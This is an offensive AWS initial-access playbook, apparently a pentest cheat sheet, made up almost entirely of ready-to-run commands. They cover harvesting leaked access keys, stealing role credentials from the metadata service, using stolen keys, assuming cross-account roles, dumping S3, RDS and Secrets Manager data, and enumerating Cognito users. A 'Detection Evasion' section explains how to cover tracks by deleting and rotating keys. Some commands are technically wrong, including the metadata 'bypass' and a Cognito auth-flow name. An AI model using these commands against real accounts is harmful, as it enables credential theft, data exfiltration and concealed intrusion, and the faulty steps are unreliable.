# AWS Initial Access

Initial access to AWS environments typically occurs through IAM credential compromise, misconfigured access controls, or public resource exposure.

## Credential Compromise

### Access Key Theft

```bash
# Search for exposed access keys
# GitHub repository scanning
curl -s 'https://api.github.com/search/code?q=org:company+AKIA' | jq '.items[] | {path, repository:.repository.url}'

# Environment variable leakage
# Application container images
docker inspect {imageId} | jq '.[].Config.Env[] | select(contains("AKIA"))'

# Configuration files
grep -r "AKIA" . --include="*.json" --include="*.yaml" --include="*.env" --include="*.conf"

# CloudTrail events showing API calls
# Can reveal access key patterns
```

### Using Compromised Credentials

```bash
# Configure AWS CLI with stolen credentials
aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Verify access
aws sts get-caller-identity

# List accessible resources
aws s3 ls
```

### Temporary Credential Extraction

```bash
# From running EC2 instance (IAM role)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{roleName}

# From Lambda environment
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN

# From ECS task
curl -s $AWS_CONTAINER_CREDENTIALS_FULL_URI \
  -H "Authorization: Bearer $AWS_CONTAINER_AUTHORIZATION_TOKEN"
```

## Default Credentials

```bash
# Common default credentials in AWS services
# RDS/Database master credentials
- admin/password
- admin/admin123
- root/password

# EC2 key pair access
# If private key accessible
ssh -i {keyFile}.pem ec2-user@{publicIp}

# Default Lambda function permissions
# May allow anonymous invocation
curl -X POST https://{functionUrl}/ \
  -d '{"test":"data"}'
```

## Cross-Account Access

### Account Traversal via Trust Relationships

```bash
# Find cross-account roles
aws iam list-roles --query 'Roles[].AssumeRolePolicyDocument' -o json | \
  jq -r '.[] | select(.Statement[].Principal.AWS != null)'

# Assume role from external account
# If current account has permission

aws sts assume-role \
  --role-arn "arn:aws:iam::{accountId}:role/{roleName}" \
  --role-session-name "SessionName"

# Export temporary credentials
export AWS_ACCESS_KEY_ID={AccessKeyId}
export AWS_SECRET_ACCESS_KEY={SecretAccessKey}
export AWS_SESSION_TOKEN={SessionToken}

# Access resources in external account
aws s3 ls --recursive
```

### Cross-Account Bucket Access

```bash
# List buckets accessible from different account
aws s3 ls --profile {externalProfile}

# If bucket allows cross-account access
aws s3 ls s3://{crossAccountBucket} --profile {externalProfile}
```

## Public Resource Exposure

### S3 Public Buckets

```bash
# Check if bucket is publicly readable
aws s3 ls s3://{bucketName} --no-sign-request

# Download files without authentication
aws s3 cp s3://{bucketName}/{file} ./ --no-sign-request

# If bucket has public write access
aws s3 cp backup.sql s3://{bucketName}/ --no-sign-request
```

### Unauthenticated Lambda Access

```bash
# Lambda functions may allow unauthenticated invocation
curl -X POST https://{functionUrl}/ \
  -H "Content-Type: application/json" \
  -d '{"action":"listUsers"}'

# If Lambda has administrative permissions
# Can access resources directly from function
```

### API Gateway Without Authentication

```bash
# Check API Gateway stage configuration
aws apigateway get-stage --rest-api-id {restApiId} --stage-name {stageName}

# Check for missing authorization
# Test unauthenticated access
curl https://{apiId}.execute-api.{region}.amazonaws.com/{stage}/{resource}

# If successful, API accessible without credentials
```

## RDS Public Access Exploitation

```bash
# RDS instance publicly accessible
# If available port open

# Obtain master username
aws rds describe-db-instances --query 'DBInstances[].MasterUsername' -o tsv

# Attempt connection
mysql -h {rdsEndpoint} -u admin -p

# If successful, extract data
SELECT * FROM information_schema.tables;
SELECT * FROM sensitive_table;
```

## Parameter Store / Secrets Manager Exposure

```bash
# Check if secrets readable without authentication
# Usually requires IAM credentials

# If compromised user has access
aws secretsmanager get-secret-value --secret-id {secretName}

# Extract secrets
jq '.SecretString | fromjson' secret.json | jq '.password'

# Use database credentials from secrets
# Connect to database
```

## SNS/SQS Queue Exploitation

```bash
# Check queue permissions
aws sqs get-queue-attributes --queue-url {queueUrl} --attribute-names All

# If public access enabled
# Subscribe to SNS topic
aws sns subscribe --topic-arn {topicArn} --protocol sqs --notification-endpoint {queueArn}

# Receive messages
aws sqs receive-message --queue-url {queueUrl}
```

## Metadata Service Exploitation (IMDSv2 Bypass)

```bash
# IMDSv2 requires PUT request with token
# Check for IMDSv1 fallback

curl -s http://169.254.169.254/latest/meta-data/

# If IMDSv2 required, attempt bypass via proxy
# Or from container environment where IMDSv1 still available

# Server-side request forgery to metadata service
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
  -H "Host: attacker-controlled.com"
```

## Cognito Exploitation

```bash
# Check Cognito user pool configuration
aws cognito-idp describe-user-pool --user-pool-id {poolId}

# If open user registration
aws cognito-idp sign-up \
  --client-id {clientId} \
  --username attacker \
  --password TempPassword123!

# Enumeration attack - test valid usernames
for user in $(cat userlist.txt); do
  aws cognito-idp admin-initiate-auth \
    --user-pool-id {poolId} \
    --client-id {clientId} \
    --auth-flow ALLOW_ADMIN_NO_SRP_AUTH \
    --auth-parameters USERNAME=$user,PASSWORD=invalid 2>&1 | grep -q "NotAuthorizedException" && echo "$user exists"
done
```

## Detection Evasion

```bash
# Access from legitimate AWS services when possible
# Blend with normal IAM activity

# Avoid excessive API calls
# Spread reconnaissance across time

# Clean access keys after use
aws iam delete-access-key --access-key-id {accessKeyId}

# Or rotate keys to cover tracks
aws iam create-access-key --user-name {userName}
aws iam delete-access-key --access-key-id {oldKeyId} --user-name {userName}
```

## Key Findings

- Public S3 buckets containing sensitive data
- Publicly accessible RDS instances with weak credentials
- Unauthenticated Lambda functions with administrative permissions
- API Gateway endpoints without authorization
- Exposed access keys with administrative permissions
- Cross-account roles with overpermissioned access
- Disabled or manipulated CloudTrail logging
